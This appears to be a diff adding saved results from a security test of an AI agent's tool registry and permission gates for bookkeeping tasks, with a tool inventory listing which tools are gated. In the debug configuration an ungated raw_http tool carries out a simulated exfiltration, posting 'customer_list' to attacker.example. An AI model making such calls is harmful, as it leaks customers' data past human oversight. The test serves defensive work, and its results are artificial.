@@ -1,0 +1,120 @@
+{
+ "with_debug_tool": {
+  "tool_count": 7,
+  "privileged": 5,
+  "ungated_privileged": [
+   "raw_http"
+  ],
+  "raw_http_attack": {
+   "executed": true,
+   "result": "POST https://attacker.example/c"
+  },
+  "gated_email_attack": {
+   "executed": false,
+   "why": "gate did not allow"
+  },
+  "payment_in_invoice_loadout": {
+   "executed": false,
+   "why": "tool not in loadout invoice_draft"
+  },
+  "executed_log": [
+   [
+    "raw_http",
+    {
+     "url": "https://attacker.example/c",
+     "body": "customer_list"
+    }
+   ]
+  ]
+ },
+ "inventory_with_debug": [
+  {
+   "name": "query_books",
+   "effect": "read",
+   "irreversible": false,
+   "gated": false,
+   "loadouts": [
+    "invoice_draft",
+    "pay_propose",
+    "reconcile"
+   ]
+  },
+  {
+   "name": "read_document",
+   "effect": "read",
+   "irreversible": false,
+   "gated": false,
+   "loadouts": [
+    "invoice_draft",
+    "pay_propose",
+    "reconcile"
+   ]
+  },
+  {
+   "name": "draft_invoice",
+   "effect": "write",
+   "irreversible": false,
+   "gated": true,
+   "loadouts": [
+    "invoice_draft"
+   ]
+  },
+  {
+   "name": "send_invoice",
+   "effect": "egress",
+   "irreversible": true,
+   "gated": true,
+   "loadouts": [
+    "invoice_draft"
+   ]
+  },
+  {
+   "name": "send_email",
+   "effect": "egress",
+   "irreversible": true,
+   "gated": true,
+   "loadouts": [
+    "invoice_draft",
+    "reconcile"
+   ]
+  },
+  {
+   "name": "initiate_payment",
+   "effect": "money",
+   "irreversible": true,
+   "gated": true,
+   "loadouts": [
+    "pay_propose"
+   ]
+  },
+  {
+   "name": "raw_http",
+   "effect": "egress",
+   "irreversible": true,
+   "gated": false,
+   "loadouts": [
+    "invoice_draft",
+    "pay_propose",
+    "reconcile"
+   ]
+  }
+ ],
+ "registry_clean": {
+  "tool_count": 6,
+  "privileged": 4,
+  "ungated_privileged": [],
+  "raw_http_attack": {
+   "executed": false,
+   "why": "unknown tool"
+  },
+  "gated_email_attack": {
+   "executed": false,
+   "why": "gate did not allow"
+  },
+  "payment_in_invoice_loadout": {
+   "executed": false,
+   "why": "tool not in loadout invoice_draft"
+  },
+  "executed_log": []
+ }
+}
